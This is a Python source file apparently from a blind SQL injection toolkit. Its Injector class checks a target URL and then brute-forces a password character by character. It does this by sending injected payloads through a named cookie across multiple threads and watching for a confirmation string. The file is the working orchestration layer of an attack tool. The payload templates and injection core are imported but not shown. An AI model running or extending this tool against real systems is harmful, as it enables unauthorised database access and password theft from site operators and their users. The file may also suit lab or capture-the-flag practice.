#!/usr/bin/env python3.12
# cookie_injector.py

import datetime
import http.client
import logging
import sys
from queue import Queue

import requests
from rich.console import Console
from rich.live import Live
from rich.panel import Panel

from SQLInjector.brute_forcer import BruteForcer
from SQLInjector.cookie_injector_core import CookieInjector
from SQLInjector.reverse_logger import ReverseLogger, filename_parser

filename, log_filename = filename_parser(log_file_name=__file__)
rev_log = ReverseLogger(
    logger_name=filename,
    log_file_path=log_filename,
    logging_level=logging.INFO,
)
from SQLInjector.reverse_logger import log_error_and_raise_exception, log_error, log_info


class Injector:
    def __init__(self, target_url, confirm_string, cookie_name, passwd_length: int, char_set, inject_code,
                 max_threads: int):
        self.c = Console()
        self.url = target_url
        self.confirm_string = confirm_string
        self.cookie_name = cookie_name
        self.passwd_length = passwd_length
        self.char_set = char_set
        self.inject_code = inject_code
        self.max_threads = max_threads
        self.queues = [Queue() for _queue in range(self.max_threads)]
        self.found_characters = {}
        self.discard_seq_num = []
        self.debug_skipped = []
        self.status_code_to_description = {}

    # ADD LOGGING HERE
    def check_url(self):
        self.status_code_to_description = {code: description for code, description in http.client.responses.items()}
        try:
            response = requests.head(self.url)
            if response.status_code == 200:
                self.c.print(f"The URL is responding", style="green")
            self.c.print(
                f"Status code {response.status_code} -> {self.status_code_to_description[response.status_code]}.\n"
                f"Press CTRL+C to abort."
            )
        except requests.RequestException as e:
            self.c.print(f"Error: {e}")
            print()
            self.c.print(f"The URL {self.url} is not responding.", style="red")
            sys.exit(1)

    def brute_forcer(self):
        bf = BruteForcer(self.passwd_length, self.char_set, self.inject_code)
        for i, payload_kit in enumerate(bf.brute_force()):
            thread_id = i % self.max_threads
            self.queues[thread_id].put(payload_kit)

    def cookie_injector(self, inject_code, seq_num, char, start_time):
        if seq_num not in self.discard_seq_num:
            cookie_injector = CookieInjector(self.url, self.confirm_string, self.cookie_name)
            char_found = cookie_injector.run(inject_code, seq_num, char)
            if char_found:
                self.found_characters[f"Char {seq_num}"] = char
                self.discard_seq_num.append(seq_num)
                now = datetime.datetime.now()
                elapsed_time = now - start_time
                with Live():
                    self.c.print(
                        Panel(
                            f"{self.found_characters}\n"
                            f"Brute forced positions {len(self.discard_seq_num)} --> {self.discard_seq_num}\n"
                            f"Time elapsed {elapsed_time}",
                            title="Found Char",
                            title_align="left",
                            highlight=True
                        )
                    )
        else:
            pass
